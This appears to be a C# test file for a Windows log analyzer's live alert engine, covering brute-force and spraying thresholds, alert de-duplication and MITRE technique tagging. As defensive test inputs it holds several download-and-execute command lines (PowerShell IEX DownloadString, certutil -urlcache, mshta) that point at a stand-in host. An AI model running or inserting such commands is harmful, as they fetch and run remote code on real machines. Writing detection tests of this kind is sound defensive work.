using System;
using System.Linq;
using LogAnalyzer.Core.Models;
using LogAnalyzer.Core.Services.Network;
using Xunit;

namespace LogAnalyzer.UI.Tests
{
    /// <summary>Senior review L10, D12, D24, D25: live alerts are per station and source, de-duplicated, and never raised on a bare keyword.</summary>
    public class LiveAlertNoiseTests
    {
        private const string Ns = "http://schemas.microsoft.com/win/2004/08/events/event";
        private static readonly DateTime T0 = new(2026, 10, 11, 9, 0, 0, DateTimeKind.Utc);

        private static ParsedEvent Failed(string user, string ip, int minute, string host = "WS-01") => new()
        {
            EventId = 4625, MachineName = host, TimeCreated = T0.AddMinutes(minute), Message = "An account failed to log on.",
            XmlData = $"<Event xmlns=\"{Ns}\"><EventData><Data Name=\"TargetUserName\">{user}</Data><Data Name=\"IpAddress\">{ip}</Data></EventData></Event>",
        };

        private static ParsedEvent Cmd(string text) => new() { EventId = 4688, MachineName = "WS-01", TimeCreated = T0, Message = "Process Command Line: " + text };

        [Fact]
        public void Four_wrong_passwords_are_quiet_the_fifth_for_the_same_account_is_one_medium_alert()
        {
            var e = new LiveSecurityMonitoringEngine();
            for (int i = 0; i < 4; i++) Assert.Null(e.EvaluateLiveEvent(Failed("ion", "10.0.0.5", i)));
            var a = e.EvaluateLiveEvent(Failed("ion", "10.0.0.5", 4));
            Assert.NotNull(a);
            Assert.Equal("Medium", a!.Severity);
            Assert.Equal("T1110.001", a.MitreTechniqueId);
            Assert.Contains("ion", a.Explanation);
        }

        [Fact]
        public void Failures_older_than_the_window_or_from_other_sources_do_not_add_up()
        {
            var e = new LiveSecurityMonitoringEngine();
            for (int i = 0; i < 4; i++) Assert.Null(e.EvaluateLiveEvent(Failed("ion", "10.0.0.5", i * 4)));   // 0,4,8,12 min: never 5 inside 10 min
            Assert.Null(e.EvaluateLiveEvent(Failed("ion", "10.0.0.6", 13)));
            Assert.Null(e.EvaluateLiveEvent(Failed("ion", "10.0.0.5", 30, host: "WS-02")));
        }

        [Fact]
        public void Ten_accounts_from_one_source_is_password_spraying_nine_is_not()
        {
            var e = new LiveSecurityMonitoringEngine();
            for (int i = 0; i < 9; i++) Assert.Null(e.EvaluateLiveEvent(Failed("user" + i, "10.0.0.9", 0)));
            var a = e.EvaluateLiveEvent(Failed("user9", "10.0.0.9", 1));
            Assert.Equal("T1110.003", a!.MitreTechniqueId);
            Assert.Equal("High", a.Severity);
        }

        [Theory]
        [InlineData("Am primit un e-mail de phishing de la colegi")]
        [InlineData("powershell.exe -ExecutionPolicy Bypass -File C:\\Windows\\ccmcache\\install.ps1")]
        [InlineData("wevtutil qe Security /c:5 /f:text")]
        [InlineData("Invoke-WebRequest https://intranet/raport.pdf")]
        public void A_bare_keyword_or_normal_administration_raises_nothing(string text) =>
            Assert.Null(new LiveSecurityMonitoringEngine().EvaluateLiveEvent(Cmd(text)));

        [Theory]
        [InlineData("powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA", "T1059.001")]
        [InlineData("powershell -c \"IEX (New-Object Net.WebClient).DownloadString('http://x/a')\"", "T1059.001")]
        [InlineData("certutil -urlcache -f http://x/a.exe a.exe", "T1105")]
        [InlineData("mshta https://x/a.hta", "T1218.005")]
        public void Real_abuse_still_raises_an_alert_with_one_technique(string text, string technique)
        {
            var a = new LiveSecurityMonitoringEngine().EvaluateLiveEvent(Cmd(text));
            Assert.Equal(technique, a!.MitreTechniqueId);
        }

        [Fact]
        public void No_live_alert_carries_a_combined_or_invented_technique()
        {
            var e = new LiveSecurityMonitoringEngine();
            foreach (var text in new[] { "rtcore64.sys loaded", "rubber ducky payload", "lumma stealer", "rowhammer", "fansmitter acoustic" })
            {
                var a = e.EvaluateLiveEvent(Cmd(text));
                Assert.NotNull(a);
                Assert.DoesNotContain("/", a!.MitreTechniqueId ?? "");
                Assert.DoesNotContain(" ", a.MitreTechniqueId ?? "");
            }
            Assert.Equal("", e.EvaluateLiveEvent(Cmd("rowhammer"))!.MitreTechniqueId);
            Assert.Contains("NEVERIFICAT", e.EvaluateLiveEvent(Cmd("rowhammer"))!.Title);
        }

        [Fact]
        public void The_same_alert_on_the_same_station_is_shown_once_and_its_repeats_are_kept_on_it()
        {
            var engine = new LiveSecurityMonitoringEngine();
            var throttle = new LiveAlertThrottle();
            int shown = 0;
            DetectedIssue? first = null;
            for (int i = 0; i < 30; i++)
            {
                var ev = Failed("ion", "10.0.0.5", 0);
                ev.TimeCreated = T0.AddSeconds(i * 10);
                var a = engine.EvaluateLiveEvent(ev);
                if (a is not null && throttle.Admit(a, ev)) { shown++; first ??= a; }
            }
            Assert.Equal(1, shown);
            Assert.Equal(26, first!.RelatedEvents.Count);          // the 5th failure opened it, the 25 after it were added to it
            Assert.Equal(25, throttle.Suppressed);

            var later = Failed("ion", "10.0.0.5", 0);
            later.TimeCreated = T0.AddMinutes(30);
            var again = new DetectedIssue { Title = first.Title, RelatedEvents = new() { later } };
            Assert.True(throttle.Admit(again, later));               // after the window it is a new alert
            Assert.True(throttle.Admit(new DetectedIssue { Title = "x", IsTestAlert = true }, later));
            Assert.True(throttle.Admit(new DetectedIssue { Title = "x", IsTestAlert = true }, later));
        }
    }
}
